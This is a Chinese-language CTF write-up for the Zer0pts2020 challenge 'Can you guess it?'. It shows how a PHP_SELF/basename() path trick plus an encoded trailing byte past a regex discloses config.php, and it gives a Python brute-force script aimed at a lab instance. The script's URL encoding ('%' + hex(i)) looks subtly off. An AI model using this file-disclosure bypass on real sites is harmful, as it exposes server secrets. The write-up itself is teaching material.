# [Zer0pts2020]Can you guess it?

进入题目即可得到源码：

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

根据题目标题，再看到有一段生成随机数的语段，想到破解随机数即可得到flag
```php
$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
```

但是此随机数并不可像 `mt_rand` 实现破解

向上寻找，看到此段

```php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
```

此段用`basename()`获取了 `PHP_SELF` 中的尾部文件名，而我们在正常文件后加上其他文件的地址并不会影响正常访问

以测试页面为例：
```php
<?php
highlight_file(__FILE__);

if(isset($_GET['source'])) {
    $source = $_GET['source'];
}

echo $_SERVER['PHP_SELF'] . "</br>";
echo basename($_SERVER['PHP_SELF']);
```

分别访问 index.php 和 index.php/config.php

![01]()
![02]()

并且在经过basename()的作用后拆分出了 `config.php`，恰好满足题目的需求

这时即可得到访问 `config.php` 的顺序：先在正常url后边加上config.php，使之在满足不访问config.php的条件下经过highlight_file()显示出config.php内的内容，而且flag就藏在config.php内。

最后需要满足的条件就是绕过正则：
```text
/config\.php\/*$/i
```

这个加上 `$` 的匹配是在尾部进行的，先进行测试

![03]()
可以看到直接访问config.php会直接被匹配，这时直接在尾部加上一些特殊内容即可实现绕过，例如常见的 %0d，%0a等等

![04]()

但是直接访问发现并不能访问到内容，直接用脚本得到可访问的内容

```python
import requests
import time

def get_true():
    base_url = "http://2ae89acf-b141-4717-8262-21ddf6846777.node3.buuoj.cn/index.php/config.php/{0}?source"

    for i in range(500):
        url = base_url.format("%" + hex(i))
        res = requests.get(url)

        if r'flag' in res.text:
            print(res.text)
            break
        print(i)
        time.sleep(0.5)

if __name__ == "__main__":
    get_true()
```

![06]()
